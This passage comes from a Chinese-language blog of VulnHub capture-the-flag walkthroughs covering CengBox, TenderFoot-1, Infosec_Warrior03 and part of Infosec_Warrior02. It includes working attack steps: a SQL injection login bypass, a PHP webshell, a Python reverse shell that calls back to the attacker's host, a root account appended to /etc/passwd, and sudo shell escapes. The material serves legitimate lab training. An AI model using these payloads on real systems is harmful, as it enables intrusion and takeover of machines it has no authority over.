<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -6 hackforfun</span><br><span class="line">	$6$qKge9GxrDANmLdaL$KZsmUQjuwSCG5TOZoBJW80ECpul61n9RbTRe03iL2qbdodW2bS1u2kpCHnpF.wEF4nulOxUxmkhRo&#x2F;OpUmyxe1</span><br><span class="line">echo &#39;test:$6$qKge9GxrDANmLdaL$KZsmUQjuwSCG5TOZoBJW80ECpul61n9RbTRe03iL2qbdodW2bS1u2kpCHnpF.wEF4nulOxUxmkhRo&#x2F;OpUmyxe1:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; passwd</span><br><span class="line">zip new.zip passwd</span><br><span class="line">sudo -u root &#x2F;usr&#x2F;bin&#x2F;unzip new.zip -d &#x2F;etc</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior02/img/16.png" alt="" /></p>
<hr />
<blockquote>
<p>python2 input()</p>
</blockquote>
<p>python2的函数input()会执行输入的数据，插入python命令即可Getshell或反弹Shell，而使用函数raw_input()则不会执行命令</p>
<p>参考资料</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://hack-tips.com/2020/04/13/vulnhub-infosecwarrior-ctf-2020-02walkthrough/">WalkThrough</a></p>
</blockquote>
<hr />
<h1 id="infosec_warrior03"><a class="markdownIt-Anchor" href="#infosec_warrior03"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/infosecwarrior-ctf-2020-03,449/">Infosec_Warrior03</a></h1>
<p><code>2020/09/21 19:24:32</code></p>
<h2 id="寻找靶机ip-16"><a class="markdownIt-Anchor" href="#寻找靶机ip-16"></a> 寻找靶机IP</h2>
<p><code>nmap -sn -T5 192.168.110.0/24 | grep -B2 virtual</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/00.png" alt="" /></p>
<h2 id="端口扫描-32"><a class="markdownIt-Anchor" href="#端口扫描-32"></a> 端口扫描</h2>
<p><code>nmap -p- -A -T5 -v -n 192.168.110.6</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/01.png" alt="" /></p>
<h2 id="web路径扫描-15"><a class="markdownIt-Anchor" href="#web路径扫描-15"></a> Web路径扫描</h2>
<p><code>dirb http://192.168.110.6/</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/02.png" alt="" /></p>
<h2 id="漏洞利用-32"><a class="markdownIt-Anchor" href="#漏洞利用-32"></a> 漏洞利用</h2>
<p>访问<code>http://192.168.110.6/phpMyAdmin/</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/03.png" alt="" /></p>
<p>使用弱口令登入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:root</span><br><span class="line">password:root</span><br></pre></td></tr></table></figure>
<p>查询mysql.user中的账户信息</p>
<p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/04.png" alt="" /></p>
<p>得到两个账户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</span><br><span class="line">krishna:4DC8EC6204F12795FE54CC79FFA2A8579A947D04</span><br></pre></td></tr></table></figure>
<p>进行md5查询之后得到明文口令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:root</span><br><span class="line">krishna:infosec</span><br></pre></td></tr></table></figure>
<p>尝试使用<code>krishna:infosec</code>登入SSH服务</p>
<p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/05.png" alt="" /></p>
<h2 id="权限提升-32"><a class="markdownIt-Anchor" href="#权限提升-32"></a> 权限提升</h2>
<p>查看sudo权限</p>
<p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/06.png" alt="" /></p>
<p>使用gcc进行提权</p>
<p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/07.png" alt="" /></p>
<p>查看sudo权限</p>
<p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/08.png" alt="" /></p>
<p>使用gcc进行提权</p>
<p><img src="/images/vulnhub_walkthrough_set/Infosec_Warrior03/img/09.png" alt="" /></p>
<hr />
<blockquote>
<p>Shell脚本提权与空格</p>
</blockquote>
<p>使用shell脚本进行sudo/suid提权时，参数中带有空格则需要使用引号</p>
<p>参考资料</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.hacknos.com/infosecwarrior-ctf-2020-03-walkthrough/">WalkThrough</a></p>
</blockquote>
<hr />
<h1 id="cengbox"><a class="markdownIt-Anchor" href="#cengbox"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/cengbox-1,475/">CengBox</a></h1>
<p><code>2020/10/25 16:31:59</code></p>
<h2 id="寻找靶机ip-17"><a class="markdownIt-Anchor" href="#寻找靶机ip-17"></a> 寻找靶机IP</h2>
<p><code>nmap -sn -T5 192.168.1.0/24 | grep -B2 virtual</code></p>
<p><img src="/images/vulnhub_walkthrough_set/CengBox/img/00.png" alt="" /></p>
<h2 id="端口扫描-33"><a class="markdownIt-Anchor" href="#端口扫描-33"></a> 端口扫描</h2>
<p><code>nmap -p 1-65535 -A -T5 192.168.1.104</code></p>
<p><img src="/images/vulnhub_walkthrough_set/CengBox/img/01.png" alt="" /></p>
<h2 id="web路径扫描-16"><a class="markdownIt-Anchor" href="#web路径扫描-16"></a> Web路径扫描</h2>
<p><code>gobuster dir -u http://192.168.1.104 -w /usr/share/wordlists/dirb/big.txt</code></p>
<p><img src="/images/vulnhub_walkthrough_set/CengBox/img/02.png" alt="" /></p>
<p><img src="/images/vulnhub_walkthrough_set/CengBox/img/03.png" alt="" /></p>
<h2 id="漏洞利用-33"><a class="markdownIt-Anchor" href="#漏洞利用-33"></a> 漏洞利用</h2>
<p>访问 <code>http://192.168.1.104/masteradmin/login.php</code></p>
<p><img src="/images/vulnhub_walkthrough_set/CengBox/img/04.png" alt="" /></p>
<p>尝试SQL注入绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;1&#39; or 1#</span><br><span class="line">passwrod&#x3D;1</span><br></pre></td></tr></table></figure>
<p>绕过登录，跳转至 <code>http://192.168.1.104/masteradmin/upload.php</code></p>
<p><img src="/images/vulnhub_walkthrough_set/CengBox/img/05.png" alt="" /></p>
<p>尝试上传shell.php，返回错误信息</p>
<p><img src="/images/vulnhub_walkthrough_set/CengBox/img/06.png" alt="" /></p>
<p>更改文件名为shell.php.ceng，上传成功</p>
<p><img src="/images/vulnhub_walkthrough_set/CengBox/img/07.png" alt="" /></p>
<p>WebShell的内容为 <code>&lt;?php @system($_GET[&quot;cmd&quot;]);?&gt;</code></p>
<p>WebShell存放路径为 <code>/uploads/shell.php.ceng</code></p>
<p><img src="/images/vulnhub_walkthrough_set/CengBox/img/08.png" alt="" /></p>
<p>存在python3环境</p>
<p><img src="/images/vulnhub_walkthrough_set/CengBox/img/09.png" alt="" /></p>
<p>使用WebShell进行反弹Shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9908</span><br><span class="line">curl http:&#x2F;&#x2F;192.168.1.104&#x2F;uploads&#x2F;shell.php.ceng?cmd&#x3D;python3%20-c%20%22import%20os%2Csocket%2Csubprocess%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%27192.168.1.109%27%2C9908%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%27&#x2F;bin&#x2F;bash%27%2C%27-i%27%5D%29%3B%22</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/CengBox/img/10.png" alt="" /></p>
<h2 id="权限提升-33"><a class="markdownIt-Anchor" href="#权限提升-33"></a> 权限提升</h2>
<p>获取tty, 查看系统信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line">uname -a</span><br><span class="line">cat &#x2F;etc&#x2F;*release</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/CengBox/img/11.png" alt="" /></p>
<p>查看数据库信息<br />
<code>cat /var/www/html/masteradmin/db.php</code><br />
得到数据库账户信息 <code>root:SuperS3cR3TPassw0rd1!</code></p>
<p><img src="/images/vulnhub_walkthrough_set/CengBox/img/12.png" alt="" /></p>
<p>进入数据库查看Web账户信息<br />
<code>mysql -u root -pSuperS3cR3TPassw0rd1! -e 'select * from cengbox.admin;'</code><br />
得到Web账户信息 <code>masteradmin:C3ng0v3R00T1!</code><br />
<img src="/images/vulnhub_walkthrough_set/CengBox/img/13.png" alt="" /></p>
<p>查看账户信息<br />
<code>cat /etc/passwd</code></p>
<p><img src="/images/vulnhub_walkthrough_set/CengBox/img/14.png" alt="" /></p>
<p>尝试登入cengover账户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh cengover@192.168.1.104</span><br><span class="line">C3ng0v3R00T1!</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/CengBox/img/15.png" alt="" /></p>
<p>在pspy目录开启HTTP服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -m SimpleHTTPServer 9900&amp;</span><br></pre></td></tr></table></figure>
<p>下载并使用pspy</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">curl -O http:&#x2F;&#x2F;192.168.1.109:9900&#x2F;pspy64</span><br><span class="line">chmod +x pspy64</span><br><span class="line">.&#x2F;pspy64&amp;</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/CengBox/img/16.png" alt="" /></p>
<p>存在root的计划任务<br />
查看脚本文件</p>
<p><img src="/images/vulnhub_walkthrough_set/CengBox/img/17.png" alt="" /></p>
<p>拥有写入权限<br />
可以写入反弹Shell命令</p>
<p><img src="/images/vulnhub_walkthrough_set/CengBox/img/18.png" alt="" /></p>
<p>监听端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8087</span><br></pre></td></tr></table></figure>
<p>获取root权限</p>
<p><img src="/images/vulnhub_walkthrough_set/CengBox/img/19.png" alt="" /></p>
<hr />
<p>参考资料</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.hacknos.com/cengbox-1-vulnhub-walkthrough/">WalkThrough</a></p>
</blockquote>
<hr />
<h1 id="tenderfoot-1"><a class="markdownIt-Anchor" href="#tenderfoot-1"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/tenderfoot-1,581/">TenderFoot-1</a></h1>
<p><code>2020/10/28 21:29:04</code></p>
<h2 id="寻找靶机ip-18"><a class="markdownIt-Anchor" href="#寻找靶机ip-18"></a> 寻找靶机IP</h2>
<p><code>nmap -sn -T5 192.168.1.0/24 | grep -B2 virtual</code></p>
<p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/00.png" alt="" /></p>
<h2 id="端口扫描-34"><a class="markdownIt-Anchor" href="#端口扫描-34"></a> 端口扫描</h2>
<p><code>nmap -p 1-65535 -sV -T5 -v -n 192.168.1.108</code></p>
<p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/01.png" alt="" /></p>
<h2 id="web路径扫描-17"><a class="markdownIt-Anchor" href="#web路径扫描-17"></a> Web路径扫描</h2>
<p><code>dirb http://192.168.1.108/ -w</code></p>
<p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/02.png" alt="" /></p>
<h2 id="漏洞利用-34"><a class="markdownIt-Anchor" href="#漏洞利用-34"></a> 漏洞利用</h2>
<p>访问 <code>http://192.168.1.108/</code></p>
<p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/03.png" alt="" /><br />
提示需要进行路径枚举</p>
<p>查看源代码得到提示 <code>/robots.txt</code></p>
<p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/04.png" alt="" /></p>
<p><code>/robots.txt</code> 提示路径 <code>/hint</code><br />
访问<code>/hint</code></p>
<p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/05.png" alt="" /><br />
存在HTML注释中存在Base32编码<br />
解码结果为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> ____________________</span><br><span class="line">| N0thing Here!      |</span><br><span class="line">| Try something else!|</span><br><span class="line"> --------------------</span><br><span class="line">Enumerate more :)�</span><br></pre></td></tr></table></figure>
<p>继续枚举路径</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.1.108&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-1.0.txt</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/06.png" alt="" /></p>
<p>访问 <code>/fotocd</code><br />
HTML注释中存在BrainFuck编码</p>
<p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/07.png" alt="" /></p>
<p>解码结果为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">JDk5OTkwJA&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">Did you found username ?</span><br><span class="line">if yes:</span><br><span class="line">    Then you have cred. of one user, enter into user account </span><br><span class="line">    by ssh port. syntax:&#123;ssh username@IP&#125;</span><br><span class="line">if not:</span><br><span class="line">    Then enumerate more :)</span><br><span class="line">    G00D LUCK !</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo -n &#39;JDk5OTkwJA&#x3D;&#x3D;&#39; | base64 -d</span><br><span class="line">$99990$</span><br></pre></td></tr></table></figure>
<p>继续枚举其他类型WEB文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http:&#x2F;&#x2F;192.168.1.108&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-1.0.txt -x .html,.php,.css,.js</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/08.png" alt="" /></p>
<p>访问 <code>/entry.js</code><br />
内容为 <code>monica</code></p>
<p>登入SSH服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh monica@192.168.1.108</span><br><span class="line">$99990$</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/09.png" alt="" /></p>
<h2 id="权限提升-34"><a class="markdownIt-Anchor" href="#权限提升-34"></a> 权限提升</h2>
<p>得到提示信息</p>
<p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/10.png" alt="" /></p>
<p>访问 <code>/fotocd/0x0343548764</code></p>
<p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/11.png" alt="" /></p>
<p>下载并解压ZIP文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;192.168.1.108&#x2F;fotocd&#x2F;0x0343548764&#x2F;joey.zip</span><br><span class="line">unzip joey.zip</span><br><span class="line">#9175</span><br></pre></td></tr></table></figure>
<p>得到两个文件: <code>gift.zip</code>, <code>note.txt</code><br />
note.txt的内容为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Not this time DUDE!</span><br><span class="line"></span><br><span class="line">Just G00GLE and learn how to crack zip passwords :)</span><br><span class="line"></span><br><span class="line">you will learn new thing!</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
<p>破解gift.zip</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip gift.zip -D -p &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -u</span><br></pre></td></tr></table></figure>
<p>得到密码为 <code>h4ck3d</code></p>
<p>解压后得到 <code>gift.txt</code>，内容为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Hahaha! there is no gift !</span><br><span class="line">Your Bad Luck!</span><br><span class="line"></span><br><span class="line">But what happened if you don&#39;t get gift.</span><br><span class="line"></span><br><span class="line">Take a hint from my side, which may help you to solve this box further.</span><br><span class="line"></span><br><span class="line">I make a binary to get another user&#39;s shell,</span><br><span class="line">Just google, command for search&#x2F;find SUID or binaries and figure it out how to execute this binary.</span><br><span class="line"></span><br><span class="line">G00D LUCK! :)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
<p>搜索SUID文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
<p>找到文件 <code>/opt/exec/chandler</code><br />
执行后用户身份变为 <code>chandler</code></p>
<p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/12.png" alt="" /></p>
<p>查看提示信息</p>
<p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/13.png" alt="" /></p>
<p>Base32解码的结果为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passwd:Y0uCr4ckM3</span><br></pre></td></tr></table></figure>
<p>SSH登入chandler账户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh chandler@192.168.1.108</span><br><span class="line">Y0uCr4ckM3</span><br></pre></td></tr></table></figure>
<p>查看sudo权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/14.png" alt="" /></p>
<p>进行sudo提权</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root &#x2F;usr&#x2F;bin&#x2F;ftp</span><br><span class="line">!&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<p><img src="/images/vulnhub_walkthrough_set/TenderFoot-1/img/15.png" alt="" /></p>
<hr />
<blockquote>
<p>SUDO &amp; GID</p>
</blockquote>
<p>使用脚本切换用户身份时，只是简单地更换了UID与GID，并没有添加用户所属的groups，所以不能直接进行sudo提权而是需要使用SSH登入之后再提权</p>
<p>参考资料</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.infosecarticles.com/tenderfoot-vulnhub-walkthrough/">WalkThrough</a></p>
</blockquote>
<hr />
<h1 id="symfonos-2"><a class="markdownIt-Anchor" href="#symfonos-2"></a> <a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/symfonos-2,331/">symfonos 2</a></h1>
<p><code>2020/10/28 08:21:48</code></p>
<h2 id="寻找靶机ip-19"><a class="markdownIt-Anchor" href="#寻找靶机ip-19"></a> 寻找靶机IP</h2>
<p><code>nmap -sn -T5 192.168.1.0/24 | grep -B2 virtual</code></p>
<p><img src="/images/vulnhub_walkthrough_set/Symfonos2/img/00.png" alt="" /></p>
<h2 id="端口扫描-35"><a class="markdownIt-Anchor" href="#端口扫描-35"></a> 端口扫描</h2>
